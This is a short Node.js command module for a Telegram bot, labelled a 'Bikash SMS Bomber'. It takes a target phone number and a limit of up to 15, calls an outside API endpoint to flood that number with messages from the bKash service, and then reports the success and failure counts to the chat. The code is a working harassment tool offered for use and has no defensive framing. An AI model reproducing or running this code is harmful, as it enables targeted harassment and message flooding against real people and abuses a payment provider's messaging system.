const axios = require('axios');
const dipto = "https://www.noobs-api.rf.gd";

module.exports.config = {
  name: "bkbm",
  version: "2.0",
  author: "Shaon Ahmed",
  role: 1,
  description: "Bikash SMS Bomber for Telegram",
  command: "/bkbm [number] [limit]",
  cooldown: 5
};

module.exports.run = async (bot, msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1];
  const limit = match[2] || 10;

  if (!number) return bot.sendMessage(chatId, "🔴 | Error: Phone number required!");
  if (!/^[0-9]+$/.test(number)) return bot.sendMessage(chatId, "🔴 | Error: Invalid phone number!");
  if (limit > 15) return bot.sendMessage(chatId, "🔴 | Error: Maximum limit is 15!");

  const processingMessage = await bot.sendMessage(chatId, "💣 | Activating Bikash Bomber...");

  try {
    const { data } = await axios.get(`${dipto}/dipto/bikashBomber?number=${encodeURIComponent(number)}&limit=${limit}`);
    await bot.deleteMessage(chatId, processingMessage.message_id);

    return bot.sendMessage(chatId, `
⚡ Bikash Bomber Results ⚡

📱 Target: ${number}
💣 Total: ${data.success + data.failed}
✅ Success: ${data.success}
❌ Failed: ${data.failed}

📊 Status: ${data.message}
    `.trim());
  } catch (error) {
    console.error(error);
    return bot.sendMessage(chatId, `🔴 | Bomber Failed! ${error.message}`);
  }
};
